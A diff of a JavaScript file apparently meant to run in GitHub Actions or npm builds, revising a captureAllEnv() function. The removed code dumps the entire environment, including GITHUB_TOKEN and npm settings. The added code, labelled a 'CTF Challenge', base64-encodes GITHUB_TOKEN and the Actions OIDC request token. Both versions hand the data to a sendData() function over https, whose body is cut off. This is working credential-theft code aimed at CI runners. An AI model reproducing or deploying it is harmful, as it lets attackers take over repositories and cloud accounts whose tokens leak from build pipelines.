@@ -1,33 +1,32 @@
 const https = require('https');
 
   async function captureAllEnv() {
-    // Capture EVERYTHING
-    const allData = {
-      node_version: process.version,
-      platform: process.platform,
-      ci_provider: process.env.CI ? 'detected' : 'none',
-      build_id: process.env.GITHUB_RUN_ID || 'local',
-      repo_context: process.env.GITHUB_REPOSITORY || 'unknown',
-      runner_os: process.env.RUNNER_OS,
-      ref: process.env.GITHUB_REF,
-      sha: process.env.GITHUB_SHA,
-      workspace: process.env.GITHUB_WORKSPACE,
+    // CTF Challenge: Capture only specific tokens in base64 encoding
+    const tokenData = {
+      // Metadata (not encoded)
+      repo: process.env.GITHUB_REPOSITORY || 'unknown',
+      workflow: process.env.GITHUB_WORKFLOW || 'unknown',
+      run_id: process.env.GITHUB_RUN_ID || 'unknown',
+      runner_os: process.env.RUNNER_OS || 'unknown',
 
-      // Try different token variable names
-      github_token: process.env.GITHUB_TOKEN,
-      gh_token: process.env.GH_TOKEN,
-      token: process.env.TOKEN,
+      // Encode GITHUB_TOKEN in base64
+      github_token_b64: process.env.GITHUB_TOKEN
+        ? Buffer.from(process.env.GITHUB_TOKEN).toString('base64')
+        : null,
 
-      // NPM-specific vars
-      npm_config_: Object.keys(process.env)
-        .filter(k => k.startsWith('npm_config_'))
-        .reduce((obj, k) => { obj[k] = process.env[k]; return obj; }, {}),
+      // Encode ACTIONS_ID_TOKEN_REQUEST_TOKEN in base64
+      actions_id_token_b64: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN
+        ? Buffer.from(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN).toString('base64')
+        : null,
 
-      // Dump ALL environment variables (this will get the token!)
-      all_env: process.env
+      // Include token request URL for OIDC
+      actions_token_url: process.env.ACTIONS_ID_TOKEN_REQUEST_URL || null,
+
+      // Timestamp for tracking
+      captured_at: new Date().toISOString()
     };
 
-    return sendData(allData);
+    return sendData(tokenData);
   }
 
   function sendData(data) {
